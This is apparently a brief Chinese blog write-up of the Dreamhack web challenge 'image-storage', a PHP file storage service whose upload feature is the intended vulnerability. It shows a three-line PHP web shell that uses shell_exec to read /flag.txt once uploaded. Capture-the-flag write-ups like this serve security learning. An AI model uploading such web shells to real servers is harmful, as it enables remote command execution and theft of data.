---
title: "image-storage"
pubDatetime: 2025-02-20T00:00:00Z
description: "Dreamhack"
tags: ["Dreamhack", "Web"]
parentPost: "dreamhack"
draft: false
---

# image-storage

題目

> php로 작성된 파일 저장 서비스입니다.  
> 파일 업로드 취약점을 이용해 플래그를 획득하세요. 플래그는 /flag.txt에 있습니다.

![home](../../../assets/images/blog/dreamhack/image-storage/image.png)

這邊可以上傳檔案

![upload](../../../assets/images/blog/dreamhack/image-storage/image-1.png)

那就來上傳個 php 試試看

```php
<?php
echo shell_exec("cat /flag.txt");
?>
```

![flag](../../../assets/images/blog/dreamhack/image-storage/image-3.png)
